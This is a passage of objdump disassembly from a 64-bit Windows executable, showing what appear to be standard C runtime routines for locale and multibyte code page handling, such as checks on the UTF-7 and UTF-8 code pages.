   1400071cf:	48 8b d8             	mov    %rax,%rbx
   1400071d2:	48 85 c0             	test   %rax,%rax
   1400071d5:	75 0f                	jne    0x1400071e6
   1400071d7:	33 c9                	xor    %ecx,%ecx
   1400071d9:	e8 4e f4 ff ff       	call   0x14000662c
   1400071de:	83 c8 ff             	or     $0xffffffff,%eax
   1400071e1:	e9 dd 01 00 00       	jmp    0x1400073c3
   1400071e6:	48 8b 85 a0 01 00 00 	mov    0x1a0(%rbp),%rax
   1400071ed:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   1400071f2:	ba 04 00 00 00       	mov    $0x4,%edx
   1400071f7:	44 8b c2             	mov    %edx,%r8d
   1400071fa:	48 8b 80 88 00 00 00 	mov    0x88(%rax),%rax
   140007201:	44 8d 4a 7c          	lea    0x7c(%rdx),%r9d
   140007205:	0f 10 00             	movups (%rax),%xmm0
   140007208:	0f 10 48 10          	movups 0x10(%rax),%xmm1
   14000720c:	0f 11 01             	movups %xmm0,(%rcx)
   14000720f:	0f 10 40 20          	movups 0x20(%rax),%xmm0
   140007213:	0f 11 49 10          	movups %xmm1,0x10(%rcx)
   140007217:	0f 10 48 30          	movups 0x30(%rax),%xmm1
   14000721b:	0f 11 41 20          	movups %xmm0,0x20(%rcx)
   14000721f:	0f 10 40 40          	movups 0x40(%rax),%xmm0
   140007223:	0f 11 49 30          	movups %xmm1,0x30(%rcx)
   140007227:	0f 10 48 50          	movups 0x50(%rax),%xmm1
   14000722b:	0f 11 41 40          	movups %xmm0,0x40(%rcx)
   14000722f:	0f 10 40 60          	movups 0x60(%rax),%xmm0
   140007233:	0f 11 49 50          	movups %xmm1,0x50(%rcx)
   140007237:	0f 10 48 70          	movups 0x70(%rax),%xmm1
   14000723b:	49 03 c1             	add    %r9,%rax
   14000723e:	0f 11 41 60          	movups %xmm0,0x60(%rcx)
   140007242:	49 03 c9             	add    %r9,%rcx
   140007245:	0f 11 49 f0          	movups %xmm1,-0x10(%rcx)
   140007249:	49 83 e8 01          	sub    $0x1,%r8
   14000724d:	75 b6                	jne    0x140007205
   14000724f:	0f 10 00             	movups (%rax),%xmm0
   140007252:	0f 10 48 10          	movups 0x10(%rax),%xmm1
   140007256:	48 8b 40 20          	mov    0x20(%rax),%rax
   14000725a:	0f 11 01             	movups %xmm0,(%rcx)
   14000725d:	0f 11 49 10          	movups %xmm1,0x10(%rcx)
   140007261:	48 89 41 20          	mov    %rax,0x20(%rcx)
   140007265:	48 8b cb             	mov    %rbx,%rcx
   140007268:	48 8d 44 24 40       	lea    0x40(%rsp),%rax
   14000726d:	0f 10 00             	movups (%rax),%xmm0
   140007270:	0f 10 48 10          	movups 0x10(%rax),%xmm1
   140007274:	0f 11 01             	movups %xmm0,(%rcx)
   140007277:	0f 10 40 20          	movups 0x20(%rax),%xmm0
   14000727b:	0f 11 49 10          	movups %xmm1,0x10(%rcx)
   14000727f:	0f 10 48 30          	movups 0x30(%rax),%xmm1
   140007283:	0f 11 41 20          	movups %xmm0,0x20(%rcx)
   140007287:	0f 10 40 40          	movups 0x40(%rax),%xmm0
   14000728b:	0f 11 49 30          	movups %xmm1,0x30(%rcx)
   14000728f:	0f 10 48 50          	movups 0x50(%rax),%xmm1
   140007293:	0f 11 41 40          	movups %xmm0,0x40(%rcx)
   140007297:	0f 10 40 60          	movups 0x60(%rax),%xmm0
   14000729b:	0f 11 49 50          	movups %xmm1,0x50(%rcx)
   14000729f:	0f 10 48 70          	movups 0x70(%rax),%xmm1
   1400072a3:	49 03 c1             	add    %r9,%rax
   1400072a6:	0f 11 41 60          	movups %xmm0,0x60(%rcx)
   1400072aa:	49 03 c9             	add    %r9,%rcx
   1400072ad:	0f 11 49 f0          	movups %xmm1,-0x10(%rcx)
   1400072b1:	48 83 ea 01          	sub    $0x1,%rdx
   1400072b5:	75 b6                	jne    0x14000726d
   1400072b7:	0f 10 00             	movups (%rax),%xmm0
   1400072ba:	0f 10 48 10          	movups 0x10(%rax),%xmm1
   1400072be:	48 8b 40 20          	mov    0x20(%rax),%rax
   1400072c2:	0f 11 01             	movups %xmm0,(%rcx)
   1400072c5:	0f 11 49 10          	movups %xmm1,0x10(%rcx)
   1400072c9:	48 89 41 20          	mov    %rax,0x20(%rcx)
   1400072cd:	8b cf                	mov    %edi,%ecx
   1400072cf:	21 13                	and    %edx,(%rbx)
   1400072d1:	48 8b d3             	mov    %rbx,%rdx
   1400072d4:	e8 37 02 00 00       	call   0x140007510
   1400072d9:	83 cf ff             	or     $0xffffffff,%edi
   1400072dc:	8b f0                	mov    %eax,%esi
   1400072de:	3b c7                	cmp    %edi,%eax
   1400072e0:	75 1a                	jne    0x1400072fc
   1400072e2:	e8 ad f2 ff ff       	call   0x140006594
   1400072e7:	48 8b cb             	mov    %rbx,%rcx
   1400072ea:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   1400072f0:	e8 37 f3 ff ff       	call   0x14000662c
   1400072f5:	8b c7                	mov    %edi,%eax
   1400072f7:	e9 c7 00 00 00       	jmp    0x1400073c3
   1400072fc:	45 84 f6             	test   %r14b,%r14b
   1400072ff:	75 05                	jne    0x140007306
   140007301:	e8 b2 dc ff ff       	call   0x140004fb8
   140007306:	48 8b 85 a0 01 00 00 	mov    0x1a0(%rbp),%rax
   14000730d:	48 8b 88 88 00 00 00 	mov    0x88(%rax),%rcx
   140007314:	8b c7                	mov    %edi,%eax
   140007316:	f0 0f c1 01          	lock xadd %eax,(%rcx)
   14000731a:	03 c7                	add    %edi,%eax
   14000731c:	75 1f                	jne    0x14000733d
   14000731e:	48 8b 85 a0 01 00 00 	mov    0x1a0(%rbp),%rax
   140007325:	48 8b 88 88 00 00 00 	mov    0x88(%rax),%rcx
   14000732c:	48 8d 05 8d 0d 01 00 	lea    0x10d8d(%rip),%rax        # 0x1400180c0
   140007333:	48 3b c8             	cmp    %rax,%rcx
   140007336:	74 05                	je     0x14000733d
   140007338:	e8 ef f2 ff ff       	call   0x14000662c
   14000733d:	c7 03 01 00 00 00    	movl   $0x1,(%rbx)
   140007343:	48 8b 85 a0 01 00 00 	mov    0x1a0(%rbp),%rax
   14000734a:	48 89 98 88 00 00 00 	mov    %rbx,0x88(%rax)
   140007351:	48 8b 85 a0 01 00 00 	mov    0x1a0(%rbp),%rax
   140007358:	8b 88 a8 03 00 00    	mov    0x3a8(%rax),%ecx
   14000735e:	85 0d ac 14 01 00    	test   %ecx,0x114ac(%rip)        # 0x140018810
   140007364:	75 54                	jne    0x1400073ba
   140007366:	48 8d 85 a0 01 00 00 	lea    0x1a0(%rbp),%rax
   14000736d:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   140007372:	4c 8d 4c 24 24       	lea    0x24(%rsp),%r9
   140007377:	48 8d 85 a8 01 00 00 	lea    0x1a8(%rbp),%rax
   14000737e:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   140007383:	4c 8d 44 24 30       	lea    0x30(%rsp),%r8
   140007388:	b8 05 00 00 00       	mov    $0x5,%eax
   14000738d:	48 8d 54 24 28       	lea    0x28(%rsp),%rdx
   140007392:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140007397:	89 44 24 24          	mov    %eax,0x24(%rsp)
   14000739b:	89 44 24 28          	mov    %eax,0x28(%rsp)
   14000739f:	e8 f8 f8 ff ff       	call   0x140006c9c
   1400073a4:	45 84 f6             	test   %r14b,%r14b
   1400073a7:	74 11                	je     0x1400073ba
   1400073a9:	48 8b 85 a8 01 00 00 	mov    0x1a8(%rbp),%rax
   1400073b0:	48 8b 08             	mov    (%rax),%rcx
   1400073b3:	48 89 0d a6 13 01 00 	mov    %rcx,0x113a6(%rip)        # 0x140018760
   1400073ba:	33 c9                	xor    %ecx,%ecx
   1400073bc:	e8 6b f2 ff ff       	call   0x14000662c
   1400073c1:	8b c6                	mov    %esi,%eax
   1400073c3:	4c 8d 9c 24 70 02 00 	lea    0x270(%rsp),%r11
   1400073ca:	00 
   1400073cb:	49 8b 5b 20          	mov    0x20(%r11),%rbx
   1400073cf:	49 8b 73 28          	mov    0x28(%r11),%rsi
   1400073d3:	49 8b e3             	mov    %r11,%rsp
   1400073d6:	41 5e                	pop    %r14
   1400073d8:	5f                   	pop    %rdi
   1400073d9:	5d                   	pop    %rbp
   1400073da:	c3                   	ret
   1400073db:	cc                   	int3
   1400073dc:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   1400073e1:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   1400073e6:	57                   	push   %rdi
   1400073e7:	48 83 ec 20          	sub    $0x20,%rsp
   1400073eb:	48 8b f2             	mov    %rdx,%rsi
   1400073ee:	48 8b f9             	mov    %rcx,%rdi
   1400073f1:	8b 05 19 14 01 00    	mov    0x11419(%rip),%eax        # 0x140018810
   1400073f7:	85 81 a8 03 00 00    	test   %eax,0x3a8(%rcx)
   1400073fd:	74 13                	je     0x140007412
   1400073ff:	48 83 b9 90 00 00 00 	cmpq   $0x0,0x90(%rcx)
   140007406:	00 
   140007407:	74 09                	je     0x140007412
   140007409:	48 8b 99 88 00 00 00 	mov    0x88(%rcx),%rbx
   140007410:	eb 64                	jmp    0x140007476
   140007412:	b9 05 00 00 00       	mov    $0x5,%ecx
   140007417:	e8 cc 05 00 00       	call   0x1400079e8
   14000741c:	90                   	nop
   14000741d:	48 8b 9f 88 00 00 00 	mov    0x88(%rdi),%rbx
   140007424:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   140007429:	48 3b 1e             	cmp    (%rsi),%rbx
   14000742c:	74 3e                	je     0x14000746c
   14000742e:	48 85 db             	test   %rbx,%rbx
   140007431:	74 22                	je     0x140007455
   140007433:	83 c8 ff             	or     $0xffffffff,%eax
   140007436:	f0 0f c1 03          	lock xadd %eax,(%rbx)
   14000743a:	83 f8 01             	cmp    $0x1,%eax
   14000743d:	75 16                	jne    0x140007455
   14000743f:	48 8d 05 7a 0c 01 00 	lea    0x10c7a(%rip),%rax        # 0x1400180c0
   140007446:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   14000744b:	48 3b c8             	cmp    %rax,%rcx
   14000744e:	74 05                	je     0x140007455
   140007450:	e8 d7 f1 ff ff       	call   0x14000662c
   140007455:	48 8b 06             	mov    (%rsi),%rax
   140007458:	48 89 87 88 00 00 00 	mov    %rax,0x88(%rdi)
   14000745f:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   140007464:	f0 ff 00             	lock incl (%rax)
   140007467:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000746c:	b9 05 00 00 00       	mov    $0x5,%ecx
   140007471:	e8 c6 05 00 00       	call   0x140007a3c
   140007476:	48 85 db             	test   %rbx,%rbx
   140007479:	74 13                	je     0x14000748e
   14000747b:	48 8b c3             	mov    %rbx,%rax
   14000747e:	48 8b 5c 24 38       	mov    0x38(%rsp),%rbx
   140007483:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   140007488:	48 83 c4 20          	add    $0x20,%rsp
   14000748c:	5f                   	pop    %rdi
   14000748d:	c3                   	ret
   14000748e:	e8 35 e2 ff ff       	call   0x1400056c8
   140007493:	90                   	nop
   140007494:	48 83 ec 28          	sub    $0x28,%rsp
   140007498:	80 3d d5 1a 01 00 00 	cmpb   $0x0,0x11ad5(%rip)        # 0x140018f74
   14000749f:	75 4c                	jne    0x1400074ed
   1400074a1:	48 8d 0d 58 0f 01 00 	lea    0x10f58(%rip),%rcx        # 0x140018400
   1400074a8:	48 89 0d b1 1a 01 00 	mov    %rcx,0x11ab1(%rip)        # 0x140018f60
   1400074af:	48 8d 05 0a 0c 01 00 	lea    0x10c0a(%rip),%rax        # 0x1400180c0
   1400074b6:	48 8d 0d 33 0e 01 00 	lea    0x10e33(%rip),%rcx        # 0x1400182f0
   1400074bd:	48 89 05 a4 1a 01 00 	mov    %rax,0x11aa4(%rip)        # 0x140018f68
   1400074c4:	48 89 0d 8d 1a 01 00 	mov    %rcx,0x11a8d(%rip)        # 0x140018f58
   1400074cb:	e8 58 e8 ff ff       	call   0x140005d28
   1400074d0:	4c 8d 0d 91 1a 01 00 	lea    0x11a91(%rip),%r9        # 0x140018f68
   1400074d7:	4c 8b c0             	mov    %rax,%r8
   1400074da:	b2 01                	mov    $0x1,%dl
   1400074dc:	b9 fd ff ff ff       	mov    $0xfffffffd,%ecx
   1400074e1:	e8 86 fc ff ff       	call   0x14000716c
   1400074e6:	c6 05 87 1a 01 00 01 	movb   $0x1,0x11a87(%rip)        # 0x140018f74
   1400074ed:	b0 01                	mov    $0x1,%al
   1400074ef:	48 83 c4 28          	add    $0x28,%rsp
   1400074f3:	c3                   	ret
   1400074f4:	48 83 ec 28          	sub    $0x28,%rsp
   1400074f8:	e8 57 e7 ff ff       	call   0x140005c54
   1400074fd:	48 8d 15 64 1a 01 00 	lea    0x11a64(%rip),%rdx        # 0x140018f68
   140007504:	48 8b c8             	mov    %rax,%rcx
   140007507:	48 83 c4 28          	add    $0x28,%rsp
   14000750b:	e9 cc fe ff ff       	jmp    0x1400073dc
   140007510:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   140007515:	48 89 6c 24 20       	mov    %rbp,0x20(%rsp)
   14000751a:	56                   	push   %rsi
   14000751b:	57                   	push   %rdi
   14000751c:	41 54                	push   %r12
   14000751e:	41 56                	push   %r14
   140007520:	41 57                	push   %r15
   140007522:	48 83 ec 40          	sub    $0x40,%rsp
   140007526:	48 8b 05 13 0b 01 00 	mov    0x10b13(%rip),%rax        # 0x140018040
   14000752d:	48 33 c4             	xor    %rsp,%rax
   140007530:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   140007535:	48 8b f2             	mov    %rdx,%rsi
   140007538:	e8 2f f9 ff ff       	call   0x140006e6c
   14000753d:	33 db                	xor    %ebx,%ebx
   14000753f:	8b f8                	mov    %eax,%edi
   140007541:	85 c0                	test   %eax,%eax
   140007543:	0f 84 54 02 00 00    	je     0x14000779d
   140007549:	4c 8d 25 c0 0f 01 00 	lea    0x10fc0(%rip),%r12        # 0x140018510
   140007550:	44 8b f3             	mov    %ebx,%r14d
   140007553:	49 8b c4             	mov    %r12,%rax
   140007556:	8d 6b 01             	lea    0x1(%rbx),%ebp
   140007559:	39 38                	cmp    %edi,(%rax)
   14000755b:	0f 84 4e 01 00 00    	je     0x1400076af
   140007561:	44 03 f5             	add    %ebp,%r14d
   140007564:	48 83 c0 30          	add    $0x30,%rax
   140007568:	41 83 fe 05          	cmp    $0x5,%r14d
   14000756c:	72 eb                	jb     0x140007559
   14000756e:	81 ff e8 fd 00 00    	cmp    $0xfde8,%edi
   140007574:	0f 84 2d 01 00 00    	je     0x1400076a7
   14000757a:	0f b7 cf             	movzwl %di,%ecx
   14000757d:	ff 15 e5 6b 00 00    	call   *0x6be5(%rip)        # 0x14000e168
   140007583:	85 c0                	test   %eax,%eax
   140007585:	0f 84 1c 01 00 00    	je     0x1400076a7
   14000758b:	b8 e9 fd 00 00       	mov    $0xfde9,%eax
   140007590:	3b f8                	cmp    %eax,%edi
   140007592:	75 2e                	jne    0x1400075c2
   140007594:	48 89 46 04          	mov    %rax,0x4(%rsi)
   140007598:	48 89 9e 20 02 00 00 	mov    %rbx,0x220(%rsi)
   14000759f:	89 5e 18             	mov    %ebx,0x18(%rsi)
   1400075a2:	66 89 5e 1c          	mov    %bx,0x1c(%rsi)
   1400075a6:	48 8d 7e 0c          	lea    0xc(%rsi),%rdi
   1400075aa:	0f b7 c3             	movzwl %bx,%eax
   1400075ad:	b9 06 00 00 00       	mov    $0x6,%ecx
   1400075b2:	66 f3 ab             	rep stos %ax,(%rdi)
   1400075b5:	48 8b ce             	mov    %rsi,%rcx
   1400075b8:	e8 c7 f9 ff ff       	call   0x140006f84
   1400075bd:	e9 e3 01 00 00       	jmp    0x1400077a5
   1400075c2:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   1400075c7:	8b cf                	mov    %edi,%ecx
   1400075c9:	ff 15 b1 6b 00 00    	call   *0x6bb1(%rip)        # 0x14000e180
   1400075cf:	85 c0                	test   %eax,%eax
   1400075d1:	0f 84 c4 00 00 00    	je     0x14000769b
   1400075d7:	48 8d 4e 18          	lea    0x18(%rsi),%rcx
   1400075db:	33 d2                	xor    %edx,%edx
   1400075dd:	41 b8 01 01 00 00    	mov    $0x101,%r8d
   1400075e3:	e8 48 59 00 00       	call   0x14000cf30
   1400075e8:	83 7c 24 20 02       	cmpl   $0x2,0x20(%rsp)
   1400075ed:	89 7e 04             	mov    %edi,0x4(%rsi)
   1400075f0:	48 89 9e 20 02 00 00 	mov    %rbx,0x220(%rsi)
   1400075f7:	0f 85 94 00 00 00    	jne    0x140007691
   1400075fd:	48 8d 4c 24 26       	lea    0x26(%rsp),%rcx
   140007602:	38 5c 24 26          	cmp    %bl,0x26(%rsp)
   140007606:	74 2c                	je     0x140007634
   140007608:	38 59 01             	cmp    %bl,0x1(%rcx)
   14000760b:	74 27                	je     0x140007634
   14000760d:	0f b6 41 01          	movzbl 0x1(%rcx),%eax
   140007611:	0f b6 11             	movzbl (%rcx),%edx
   140007614:	3b d0                	cmp    %eax,%edx
   140007616:	77 14                	ja     0x14000762c
   140007618:	2b c2                	sub    %edx,%eax
   14000761a:	8d 7a 01             	lea    0x1(%rdx),%edi
   14000761d:	8d 14 28             	lea    (%rax,%rbp,1),%edx
   140007620:	80 4c 37 18 04       	orb    $0x4,0x18(%rdi,%rsi,1)
   140007625:	03 fd                	add    %ebp,%edi
   140007627:	48 2b d5             	sub    %rbp,%rdx
   14000762a:	75 f4                	jne    0x140007620
   14000762c:	48 83 c1 02          	add    $0x2,%rcx
   140007630:	38 19                	cmp    %bl,(%rcx)
   140007632:	75 d4                	jne    0x140007608
   140007634:	48 8d 46 1a          	lea    0x1a(%rsi),%rax
   140007638:	b9 fe 00 00 00       	mov    $0xfe,%ecx
   14000763d:	80 08 08             	orb    $0x8,(%rax)
   140007640:	48 03 c5             	add    %rbp,%rax
   140007643:	48 2b cd             	sub    %rbp,%rcx
   140007646:	75 f5                	jne    0x14000763d
   140007648:	8b 4e 04             	mov    0x4(%rsi),%ecx
   14000764b:	81 e9 a4 03 00 00    	sub    $0x3a4,%ecx
   140007651:	74 2e                	je     0x140007681
   140007653:	83 e9 04             	sub    $0x4,%ecx
   140007656:	74 20                	je     0x140007678
   140007658:	83 e9 0d             	sub    $0xd,%ecx
   14000765b:	74 12                	je     0x14000766f
   14000765d:	3b cd                	cmp    %ebp,%ecx
   14000765f:	74 05                	je     0x140007666
   140007661:	48 8b c3             	mov    %rbx,%rax
   140007664:	eb 22                	jmp    0x140007688
   140007666:	48 8b 05 23 81 00 00 	mov    0x8123(%rip),%rax        # 0x14000f790
   14000766d:	eb 19                	jmp    0x140007688
   14000766f:	48 8b 05 12 81 00 00 	mov    0x8112(%rip),%rax        # 0x14000f788
   140007676:	eb 10                	jmp    0x140007688
   140007678:	48 8b 05 01 81 00 00 	mov    0x8101(%rip),%rax        # 0x14000f780
   14000767f:	eb 07                	jmp    0x140007688
   140007681:	48 8b 05 f0 80 00 00 	mov    0x80f0(%rip),%rax        # 0x14000f778
   140007688:	48 89 86 20 02 00 00 	mov    %rax,0x220(%rsi)
   14000768f:	eb 02                	jmp    0x140007693
   140007691:	8b eb                	mov    %ebx,%ebp
   140007693:	89 6e 08             	mov    %ebp,0x8(%rsi)
   140007696:	e9 0b ff ff ff       	jmp    0x1400075a6
   14000769b:	39 1d cf 18 01 00    	cmp    %ebx,0x118cf(%rip)        # 0x140018f70
   1400076a1:	0f 85 f6 00 00 00    	jne    0x14000779d
   1400076a7:	83 c8 ff             	or     $0xffffffff,%eax
   1400076aa:	e9 f8 00 00 00       	jmp    0x1400077a7
   1400076af:	48 8d 4e 18          	lea    0x18(%rsi),%rcx
   1400076b3:	33 d2                	xor    %edx,%edx
   1400076b5:	41 b8 01 01 00 00    	mov    $0x101,%r8d
   1400076bb:	e8 70 58 00 00       	call   0x14000cf30
   1400076c0:	41 8b c6             	mov    %r14d,%eax
   1400076c3:	4d 8d 4c 24 10       	lea    0x10(%r12),%r9
   1400076c8:	4c 8d 3d 31 0e 01 00 	lea    0x10e31(%rip),%r15        # 0x140018500
   1400076cf:	41 be 04 00 00 00    	mov    $0x4,%r14d
   1400076d5:	4c 8d 1c 40          	lea    (%rax,%rax,2),%r11
   1400076d9:	49 c1 e3 04          	shl    $0x4,%r11
   1400076dd:	4d 03 cb             	add    %r11,%r9
   1400076e0:	49 8b d1             	mov    %r9,%rdx
   1400076e3:	41 38 19             	cmp    %bl,(%r9)
   1400076e6:	74 3e                	je     0x140007726
   1400076e8:	38 5a 01             	cmp    %bl,0x1(%rdx)
   1400076eb:	74 39                	je     0x140007726
   1400076ed:	44 0f b6 02          	movzbl (%rdx),%r8d
   1400076f1:	0f b6 42 01          	movzbl 0x1(%rdx),%eax
   1400076f5:	44 3b c0             	cmp    %eax,%r8d
   1400076f8:	77 24                	ja     0x14000771e
   1400076fa:	45 8d 50 01          	lea    0x1(%r8),%r10d
   1400076fe:	41 81 fa 01 01 00 00 	cmp    $0x101,%r10d
   140007705:	73 17                	jae    0x14000771e
   140007707:	41 8a 07             	mov    (%r15),%al
   14000770a:	44 03 c5             	add    %ebp,%r8d
   14000770d:	41 08 44 32 18       	or     %al,0x18(%r10,%rsi,1)
   140007712:	44 03 d5             	add    %ebp,%r10d
   140007715:	0f b6 42 01          	movzbl 0x1(%rdx),%eax
   140007719:	44 3b c0             	cmp    %eax,%r8d
   14000771c:	76 e0                	jbe    0x1400076fe
   14000771e:	48 83 c2 02          	add    $0x2,%rdx
   140007722:	38 1a                	cmp    %bl,(%rdx)
   140007724:	75 c2                	jne    0x1400076e8
   140007726:	49 83 c1 08          	add    $0x8,%r9
   14000772a:	4c 03 fd             	add    %rbp,%r15
   14000772d:	4c 2b f5             	sub    %rbp,%r14
   140007730:	75 ae                	jne    0x1400076e0
   140007732:	89 7e 04             	mov    %edi,0x4(%rsi)
   140007735:	89 6e 08             	mov    %ebp,0x8(%rsi)
   140007738:	81 ef a4 03 00 00    	sub    $0x3a4,%edi
   14000773e:	74 29                	je     0x140007769
   140007740:	83 ef 04             	sub    $0x4,%edi
   140007743:	74 1b                	je     0x140007760
   140007745:	83 ef 0d             	sub    $0xd,%edi
   140007748:	74 0d                	je     0x140007757
   14000774a:	3b fd                	cmp    %ebp,%edi
   14000774c:	75 22                	jne    0x140007770
   14000774e:	48 8b 1d 3b 80 00 00 	mov    0x803b(%rip),%rbx        # 0x14000f790
   140007755:	eb 19                	jmp    0x140007770
   140007757:	48 8b 1d 2a 80 00 00 	mov    0x802a(%rip),%rbx        # 0x14000f788
   14000775e:	eb 10                	jmp    0x140007770
   140007760:	48 8b 1d 19 80 00 00 	mov    0x8019(%rip),%rbx        # 0x14000f780
   140007767:	eb 07                	jmp    0x140007770
   140007769:	48 8b 1d 08 80 00 00 	mov    0x8008(%rip),%rbx        # 0x14000f778
   140007770:	4c 2b de             	sub    %rsi,%r11
   140007773:	48 89 9e 20 02 00 00 	mov    %rbx,0x220(%rsi)
   14000777a:	48 8d 56 0c          	lea    0xc(%rsi),%rdx
   14000777e:	b9 06 00 00 00       	mov    $0x6,%ecx
   140007783:	4b 8d 3c 23          	lea    (%r11,%r12,1),%rdi
   140007787:	0f b7 44 17 f8       	movzwl -0x8(%rdi,%rdx,1),%eax
   14000778c:	66 89 02             	mov    %ax,(%rdx)
   14000778f:	48 8d 52 02          	lea    0x2(%rdx),%rdx
   140007793:	48 2b cd             	sub    %rbp,%rcx
   140007796:	75 ef                	jne    0x140007787
   140007798:	e9 18 fe ff ff       	jmp    0x1400075b5
   14000779d:	48 8b ce             	mov    %rsi,%rcx
   1400077a0:	e8 47 f7 ff ff       	call   0x140006eec
   1400077a5:	33 c0                	xor    %eax,%eax
   1400077a7:	48 8b 4c 24 38       	mov    0x38(%rsp),%rcx
   1400077ac:	48 33 cc             	xor    %rsp,%rcx
   1400077af:	e8 1c 54 00 00       	call   0x14000cbd0
   1400077b4:	4c 8d 5c 24 40       	lea    0x40(%rsp),%r11
   1400077b9:	49 8b 5b 40          	mov    0x40(%r11),%rbx
   1400077bd:	49 8b 6b 48          	mov    0x48(%r11),%rbp
   1400077c1:	49 8b e3             	mov    %r11,%rsp
   1400077c4:	41 5f                	pop    %r15
   1400077c6:	41 5e                	pop    %r14
   1400077c8:	41 5c                	pop    %r12
   1400077ca:	5f                   	pop    %rdi
   1400077cb:	5e                   	pop    %rsi
   1400077cc:	c3                   	ret
   1400077cd:	cc                   	int3
   1400077ce:	cc                   	int3
   1400077cf:	cc                   	int3
   1400077d0:	48 83 ec 28          	sub    $0x28,%rsp
   1400077d4:	ff 15 ae 69 00 00    	call   *0x69ae(%rip)        # 0x14000e188
   1400077da:	48 89 05 b7 17 01 00 	mov    %rax,0x117b7(%rip)        # 0x140018f98
   1400077e1:	ff 15 a9 69 00 00    	call   *0x69a9(%rip)        # 0x14000e190
   1400077e7:	48 89 05 b2 17 01 00 	mov    %rax,0x117b2(%rip)        # 0x140018fa0
   1400077ee:	b0 01                	mov    $0x1,%al
   1400077f0:	48 83 c4 28          	add    $0x28,%rsp
   1400077f4:	c3                   	ret
   1400077f5:	cc                   	int3
   1400077f6:	cc                   	int3
   1400077f7:	cc                   	int3
   1400077f8:	81 f9 35 c4 00 00    	cmp    $0xc435,%ecx
   1400077fe:	77 20                	ja     0x140007820
   140007800:	8d 81 d4 3b ff ff    	lea    -0xc42c(%rcx),%eax
   140007806:	83 f8 09             	cmp    $0x9,%eax
   140007809:	77 0c                	ja     0x140007817
   14000780b:	41 ba a7 02 00 00    	mov    $0x2a7,%r10d
   140007811:	41 0f a3 c2          	bt     %eax,%r10d
   140007815:	72 05                	jb     0x14000781c
   140007817:	83 f9 2a             	cmp    $0x2a,%ecx
   14000781a:	75 2f                	jne    0x14000784b
   14000781c:	33 d2                	xor    %edx,%edx
   14000781e:	eb 2b                	jmp    0x14000784b
   140007820:	81 f9 98 d6 00 00    	cmp    $0xd698,%ecx
   140007826:	74 20                	je     0x140007848
   140007828:	81 f9 a9 de 00 00    	cmp    $0xdea9,%ecx
   14000782e:	76 1b                	jbe    0x14000784b
   140007830:	81 f9 b3 de 00 00    	cmp    $0xdeb3,%ecx
   140007836:	76 e4                	jbe    0x14000781c
   140007838:	81 f9 e8 fd 00 00    	cmp    $0xfde8,%ecx
   14000783e:	74 dc                	je     0x14000781c
   140007840:	81 f9 e9 fd 00 00    	cmp    $0xfde9,%ecx
   140007846:	75 03                	jne    0x14000784b
   140007848:	83 e2 08             	and    $0x8,%edx
   14000784b:	48 ff 25 46 69 00 00 	rex.W jmp *0x6946(%rip)        # 0x14000e198
   140007852:	cc                   	int3
   140007853:	cc                   	int3
   140007854:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140007859:	57                   	push   %rdi
   14000785a:	8d 81 18 02 ff ff    	lea    -0xfde8(%rcx),%eax
   140007860:	45 8b d9             	mov    %r9d,%r11d
   140007863:	83 f8 01             	cmp    $0x1,%eax
   140007866:	49 8b d8             	mov    %r8,%rbx
   140007869:	41 0f 96 c2          	setbe  %r10b
   14000786d:	33 ff                	xor    %edi,%edi
   14000786f:	81 f9 35 c4 00 00    	cmp    $0xc435,%ecx
   140007875:	77 1c                	ja     0x140007893
   140007877:	8d 81 d4 3b ff ff    	lea    -0xc42c(%rcx),%eax
   14000787d:	83 f8 09             	cmp    $0x9,%eax
   140007880:	77 0c                	ja     0x14000788e
   140007882:	41 b8 a7 02 00 00    	mov    $0x2a7,%r8d
   140007888:	41 0f a3 c0          	bt     %eax,%r8d
   14000788c:	72 33                	jb     0x1400078c1
   14000788e:	83 f9 2a             	cmp    $0x2a,%ecx
   140007891:	eb 26                	jmp    0x1400078b9
   140007893:	81 f9 98 d6 00 00    	cmp    $0xd698,%ecx
   140007899:	74 26                	je     0x1400078c1
   14000789b:	81 f9 a9 de 00 00    	cmp    $0xdea9,%ecx
   1400078a1:	76 18                	jbe    0x1400078bb
   1400078a3:	81 f9 b3 de 00 00    	cmp    $0xdeb3,%ecx
   1400078a9:	76 16                	jbe    0x1400078c1
   1400078ab:	81 f9 e8 fd 00 00    	cmp    $0xfde8,%ecx
   1400078b1:	74 0e                	je     0x1400078c1
   1400078b3:	81 f9 e9 fd 00 00    	cmp    $0xfde9,%ecx
   1400078b9:	74 06                	je     0x1400078c1
   1400078bb:	0f ba f2 07          	btr    $0x7,%edx
   1400078bf:	eb 02                	jmp    0x1400078c3
   1400078c1:	8b d7                	mov    %edi,%edx
   1400078c3:	48 8b 44 24 48       	mov    0x48(%rsp),%rax
   1400078c8:	45 84 d2             	test   %r10b,%r10b
   1400078cb:	4c 8b 4c 24 40       	mov    0x40(%rsp),%r9
   1400078d0:	4c 8b c0             	mov    %rax,%r8
   1400078d3:	4c 0f 45 c7          	cmovne %rdi,%r8
   1400078d7:	4c 0f 45 cf          	cmovne %rdi,%r9
   1400078db:	74 07                	je     0x1400078e4
   1400078dd:	48 85 c0             	test   %rax,%rax
   1400078e0:	74 02                	je     0x1400078e4
   1400078e2:	89 38                	mov    %edi,(%rax)
   1400078e4:	4c 89 44 24 48       	mov    %r8,0x48(%rsp)
   1400078e9:	4c 8b c3             	mov    %rbx,%r8
   1400078ec:	4c 89 4c 24 40       	mov    %r9,0x40(%rsp)
   1400078f1:	45 8b cb             	mov    %r11d,%r9d
   1400078f4:	48 8b 5c 24 10       	mov    0x10(%rsp),%rbx
   1400078f9:	5f                   	pop    %rdi
   1400078fa:	48 ff 25 9f 68 00 00 	rex.W jmp *0x689f(%rip)        # 0x14000e1a0
   140007901:	cc                   	int3
   140007902:	cc                   	int3
   140007903:	cc                   	int3
